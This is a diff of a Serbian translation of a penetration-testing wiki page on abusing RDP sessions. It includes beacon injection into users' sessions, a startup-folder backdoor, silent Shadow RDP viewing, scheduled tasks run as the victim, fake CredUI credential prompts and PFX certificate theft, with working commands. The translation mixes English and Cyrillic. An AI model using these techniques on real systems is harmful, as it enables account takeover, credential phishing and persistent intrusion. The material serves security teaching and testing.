@@ -1,12 +1,12 @@
-# RDP Sessions Abuse
+# Zloupotreba RDP sesija
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## RDP Process Injection
 
-Ako **spoljna grupa** ima **RDP access** na bilo kom **računaru** u trenutnom domenu, **napadač** može **kompromitovati taj računar i sačekati korisnika**.
+Ako **spoljna grupa** ima **RDP pristup** do bilo kog **računara** u trenutnom domenu, **napadač** bi mogao **kompromitovati taj računar i sačekati tog korisnika**.
 
-Kada se taj korisnik prijavi putem RDP-a, **napadač može pivot-ovati u njegovu sesiju** i zloupotrebiti njegove dozvole u spoljnom domenu.
+Kada se taj korisnik poveže putem RDP-a, **napadač može pivotovati na sesiju tog korisnika** i zloupotrebiti njegove dozvole u eksternom domenu.
 ```bash
 # Supposing the group "External Users" has RDP access in the current domain
 ## lets find where they could access
@@ -30,13 +30,13 @@ PID   PPID  Name                         Arch  Session     User
 beacon> inject 4960 x64 tcp-local
 ## From that beacon you can just run powerview modules interacting with the external domain as that user
 ```
-Pogledajte **other ways to steal sessions with other tools** [**in this page.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)
+Pogledajte **other ways to steal sessions with other tools** [**na ovoj stranici.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)
 
 ## RDPInception
 
-Ako se korisnik poveže putem **RDP into a machine** gde ga **attacker** **čeka**, **attacker** će moći da **inject a beacon in the RDP session of the user**, i ako je **victim mounted his drive** prilikom pristupa preko RDP-a, **attacker could access it**.
+Ako se korisnik poveže putem **RDP into a machine** gde je **attacker** **waiting** za njega, attacker će moći da **inject a beacon in the RDP session of the user**, a ako je **victim mounted his drive** prilikom pristupa preko RDP-a, **attacker could access it**.
 
-U tom slučaju možete jednostavno **compromise** **victims** **original computer** tako što ćete napisati **backdoor** u **statup folder**.
+U tom slučaju jednostavno možete **compromise** the **victims** **original computer** by writing a **backdoor** in the **statup folder**.
 ```bash
 # Wait til someone logs in:
 net logons
@@ -70,19 +70,19 @@ beacon> upload C:\Payloads\pivot.exe
 ```
 ## Shadow RDP
 
-Ako ste **local admin** na hostu gde žrtva već ima **active RDP session**, možda ćete moći da **view/control that desktop without stealing the password or dumping LSASS**.
+Ако сте **local admin** на хосту где жртва већ има **active RDP session**, можда ћете моћи да **view/control that desktop without stealing the password or dumping LSASS**.
 
-Ovo zavisi od **Remote Desktop Services shadowing** politike koja je smeštena u:
+Ово зависи од политике **Remote Desktop Services shadowing** која је сачувана у:
 ```text
 HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
 ```
 Zanimljive vrednosti:
 
 - `0`: Onemogućeno
-- `1`: `EnableInputNotify` (kontrola, potrebna dozvola korisnika)
-- `2`: `EnableInputNoNotify` (kontrola, **bez odobrenja korisnika**)
-- `3`: `EnableNoInputNotify` (samo za pregled, potrebna dozvola korisnika)
-- `4`: `EnableNoInputNoNotify` (samo za pregled, **bez odobrenja korisnika**)
+- `1`: `EnableInputNotify` (kontrola, zahteva korisničko odobrenje)
+- `2`: `EnableInputNoNotify` (kontrola, **nema korisničkog odobrenja**)
+- `3`: `EnableNoInputNotify` (samo za pregled, zahteva korisničko odobrenje)
+- `4`: `EnableNoInputNoNotify` (samo za pregled, **nema korisničkog odobrenja**)
 ```cmd
 :: Check the policy
 reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow
@@ -94,53 +94,53 @@ reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shado
 quser /server:<HOST>
 mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
 ```
-Ovo je naročito korisno kada privilegovani korisnik povezan preko RDP ostavi otključan desktop, KeePass sesiju, MMC konzolu, browser sesiju ili otvoren admin shell.
+Ovo je naročito korisno kada privilegovani korisnik povezan preko RDP ostavi otključan desktop, KeePass sesiju, MMC konzolu, browser sesiju ili admin shell otvoren.
 
 ## Zakazani zadaci kao prijavljeni korisnik
 
-Ako ste **lokalni administrator** i ciljni korisnik je **trenutno prijavljen**, Task Scheduler može pokrenuti kod **kao taj korisnik bez njihove lozinke**.
+Ako ste **local admin** i ciljni korisnik je **trenutno prijavljen**, Task Scheduler može pokrenuti kod **kao taj korisnik bez njihove lozinke**.
 
-Ovo pretvara postojeću prijavnu sesiju žrtve u primitivu za izvršavanje:
+Ovo pretvara postojeću prijavnu sesiju žrtve u izvršni primitiv:
 ```cmd
 schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
 schtasks /run /S <HOST> /TN "Updater"
 ```
 Napomene:
 
-- Ako korisnik **nije prijavljen**, Windows obično zahteva lozinku da bi kreirao zadatak koji se izvršava kao taj korisnik.
-- Ako je korisnik **prijavljen**, zadatak može da ponovo iskoristi postojeći kontekst prijave.
-- Ovo je praktičan način za izvršavanje GUI akcija ili pokretanje binarnih fajlova unutar sesije žrtve bez diranja LSASS.
+- Ako korisnik **nije prijavljen**, Windows obično zahteva lozinku da bi kreirao task koji se pokreće kao taj korisnik.
+- Ako korisnik **jе prijavljen**, task može ponovo upotrebiti postojeći logon kontekst.
+- Ovo je praktičan način da se izvrše GUI akcije ili pokrenu binarni fajlovi unutar sesije žrtve bez diranja LSASS.
 
 ## Zloupotreba CredUI prompta iz sesije žrtve
 
-Kada možete da izvršavate **unutar interaktivnog desktopa žrtve** (na primer preko **Shadow RDP** ili **zakazanog zadatka koji se pokreće kao taj korisnik**), možete prikazati **pravi Windows dijalog za unos kredencijala** koristeći CredUI API-je i prikupiti kredencijale koje žrtva unese.
+Kada možete izvršavati **unutar interaktivnog desktopa žrtve** (na primer preko **Shadow RDP** ili **a scheduled task running as that user**), možete prikazati **pravi Windows credential prompt** koristeći CredUI API-je i pokupiti kredencijale koje žrtva unese.
 
 Relevant APIs:
 
 - `CredUIPromptForWindowsCredentials`
 - `CredUnPackAuthenticationBuffer`
 
-Tipičan tok:
+Tipični tok:
 
-1. Pokrenite binarni fajl u sesiji žrtve.
-2. Prikažite prompt za autentifikaciju domena koji odgovara trenutnom brendiranju.
-3. Raspakujte vraćeni auth buffer.
-4. Validirajte prosleđene kredencijale i po potrebi nastavite prikazivati prompt dok se ne unesu validni kredencijali.
+1. Pokrenuti binarni fajl u sesiji žrtve.
+2. Prikazati prompt za autentifikaciju domena koji odgovara trenutnom brendiranju domena.
+3. Raspakovati vraćeni auth buffer.
+4. Validirati unete kredencijale i po želji nastaviti sa promptovanjem dok se ne unesu važeći kredencijali.
 
-Ovo je korisno za **on-host phishing** zato što prompt renderuju standardni Windows API-ji umesto lažnog HTML formulara.
+Ovo je korisno za **on-host phishing** jer prompt renderuju standardni Windows API-ji umesto lažnog HTML formulara.
 
-## Zahtev za PFX u kontekstu žrtve
+## Zahtev PFX-a u kontekstu žrtve
 
-Isti primitiv **scheduled-task-as-user** može se koristiti da se zatraži **sertifikat/PFX kao prijavljeni korisnik**. Taj sertifikat se kasnije može koristiti za **AD authentication** kao taj korisnik, potpuno izbegavajući krađu lozinke.
+Ista primitiva **scheduled-task-as-user** može se koristiti za zahtevanje **certificate/PFX as the logged-on victim**. Taj sertifikat se kasnije može koristiti za **AD authentication** kao taj korisnik, čime se potpuno izbegne krađa lozinke.
 
 Visoki nivo toka:
 
-1. Ostvarite **local admin** na hostu na kojem je žrtva prijavljena.
-2. Pokrenite logiku za enrollment/export kao žrtva koristeći **scheduled task**.
-3. Izvezite dobijeni **PFX**.
-4. Koristite PFX za PKINIT / certificate-based AD authentication.
+1. Steći **local admin** na hostu gde je žrtva prijavljena.
+2. Pokrenuti logiku za enrollment/export kao žrtva koristeći **scheduled task**.
+3. Eksportovati dobijeni **PFX**.
+4. Koristiti PFX za PKINIT / certificate-based AD authentication.
 
-Pogledajte AD CS stranice za dalju zloupotrebu:
+See the AD CS pages for follow-up abuse:
 
 {{#ref}}
 ad-certificates/account-persistence.md
